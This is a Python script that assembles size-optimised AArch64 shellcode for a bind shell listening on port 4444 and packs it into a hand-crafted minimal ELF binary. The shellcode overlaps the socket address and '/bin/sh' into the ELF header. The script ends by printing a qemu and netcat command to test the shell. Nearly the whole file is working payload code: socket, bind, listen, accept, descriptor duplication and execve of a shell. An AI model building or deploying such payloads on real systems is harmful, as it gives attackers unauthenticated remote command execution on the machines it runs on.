#!/usr/bin/env python3
"""
AArch64 Bind Shell — ~208 bytes.
- Hardcodes socket fd=3 (clean process assumption)
- Eliminates x4 register save
- dup3 loop chains through x0
"""

import struct, subprocess, os, tempfile

BASE = 0x10000
TOTAL_HEADER_SIZE = 112
SOCKADDR_VAL = 0x0000000000005c110002  # INADDR_ANY:4444
BINSH_BYTES = b'/bin/sh\x00'


def adr_decode(inst):
    rd = inst & 0x1f
    immlo = (inst >> 29) & 3
    immhi = (inst >> 5) & 0x7ffff
    imm21 = (immhi << 2) | immlo
    if imm21 & 0x100000:
        imm21 |= ~0x1fffff
    return rd, imm21


def adr_encode(rd, imm21):
    imm21 &= 0x1fffff
    immlo = imm21 & 3
    immhi = (imm21 >> 2) & 0x7ffff
    return 0x10000000 | (immlo << 29) | (immhi << 5) | rd


def make_asm():
    return '''
    .arch armv8-a
    .text
    .global _start
_start:
    mov x0, #2
    mov x1, #1
    mov x8, #198
    svc #0
    adr x1, .
    mov x2, #16
    mov x8, #200
    svc #0
    mov x0, #3
    mov x8, #201
    svc #0
    mov x0, #3
    mov x1, xzr
    mov x2, xzr
    mov x8, #202
    svc #0
    mov x1, #3
dup_loop:
    subs x1, x1, #1
    mov x8, #24
    svc #0
    cbnz x1, dup_loop
    adr x0, binsh_ref
    mov x8, #221
    svc #0
binsh_ref:
    .asciz "/bin/sh"
'''


def build_elf(raw_code):
    binsh_off = raw_code.find(BINSH_BYTES)
    print(f"  binsh at raw offset {binsh_off:#x}")

    real_code = bytearray(raw_code[:binsh_off])
    print(f"  Code size: {len(real_code)} bytes")

    for i in range(0, len(real_code) - 4, 4):
        inst = struct.unpack('<I', real_code[i:i+4])[0]
        if (inst >> 24) == 0x10 and ((inst >> 28) & 1):
            rd, old_imm = adr_decode(inst)
            if rd == 1:
                new_imm = 0x08 - TOTAL_HEADER_SIZE - i
                print(f"  ADR X1 @ [{i:#x}]: -> hdr+0x08 (imm={new_imm:#x})")
                real_code[i:i+4] = struct.pack('<I', adr_encode(1, new_imm))
            elif rd == 0:
                new_imm = 0x28 - TOTAL_HEADER_SIZE - i
                print(f"  ADR X0 @ [{i:#x}]: -> hdr+0x28 (imm={new_imm:#x})")
                real_code[i:i+4] = struct.pack('<I', adr_encode(0, new_imm))

    total_size = TOTAL_HEADER_SIZE + len(real_code)

    h = bytearray(TOTAL_HEADER_SIZE)
    h[0:4] = b'\x7fELF'
    h[4]=2; h[5]=1; h[6]=1; h[7]=0
    struct.pack_into('<Q', h, 0x08, SOCKADDR_VAL)
    struct.pack_into('<H', h, 0x10, 2)
    struct.pack_into('<H', h, 0x12, 0xb7)
    struct.pack_into('<I', h, 0x14, 1)
    struct.pack_into('<Q', h, 0x18, BASE+TOTAL_HEADER_SIZE)
    struct.pack_into('<Q', h, 0x20, 0x38)
    struct.pack_into('<Q', h, 0x28, int.from_bytes(BINSH_BYTES,'little'))
    struct.pack_into('<I', h, 0x30, 0)
    struct.pack_into('<H', h, 0x34, 64)
    struct.pack_into('<H', h, 0x36, 56)
    struct.pack_into('<H', h, 0x38, 1)
    struct.pack_into('<H', h, 0x3a, 0)
    struct.pack_into('<H', h, 0x3c, 7)
    struct.pack_into('<H', h, 0x3e, 0)
    struct.pack_into('<I', h, 0x40, 0); struct.pack_into('<I', h, 0x44, 0)
    struct.pack_into('<Q', h, 0x48, BASE); struct.pack_into('<Q', h, 0x50, BASE)
    struct.pack_into('<Q', h, 0x58, total_size)
    struct.pack_into('<Q', h, 0x60, total_size)
    struct.pack_into('<Q', h, 0x68, 1)

    return bytes(h) + bytes(real_code)


def main():
    print("=== AArch64 Bind Shell (hardcoded fd=3) ===\n")
    asm = make_asm()

    with tempfile.TemporaryDirectory() as tmpdir:
        asm_file = os.path.join(tmpdir, 'bind.S')
        obj_file = os.path.join(tmpdir, 'bind.o')
        elf_file = os.path.join(tmpdir, 'bind.elf')
        raw_file = os.path.join(tmpdir, 'bind.bin')

        with open(asm_file, 'w') as f:
            f.write(asm)
        for cmd, label in [
            (['aarch64-linux-gnu-as', '-o', obj_file, asm_file], "Assembling"),
            (['aarch64-linux-gnu-ld', '-N', '--omagic', '-s', '-Ttext=0', '-o', elf_file, obj_file], "Linking"),
            (['aarch64-linux-gnu-objcopy', '--strip-section-headers', '-O', 'binary', elf_file, raw_file], "Extracting binary"),
        ]:
            print(f"{label}...")
            subprocess.run(cmd, check=True, capture_output=True)

        with open(raw_file, 'rb') as f:
            raw_code = f.read()
        print(f"Raw code: {len(raw_code)} bytes")
        print("\nDisassembly:")
        subprocess.run(['aarch64-linux-gnu-objdump', '-d', elf_file])
        print()

    elf_binary = build_elf(raw_code)
    output = 'bind_mini2'
    with open(output, 'wb') as f:
        f.write(elf_binary)
    os.chmod(output, 0o755)

    size = len(elf_binary)
    print(f"\n=== RESULT ===")
    print(f"Output: {output}")
    print(f"Size: {size} bytes ({216 - size} bytes saved from previous)")

    print(f"\nTest: qemu-aarch64 ./{output}  &  nc -nv 127.0.0.1 4444")


if __name__ == '__main__':
    main()
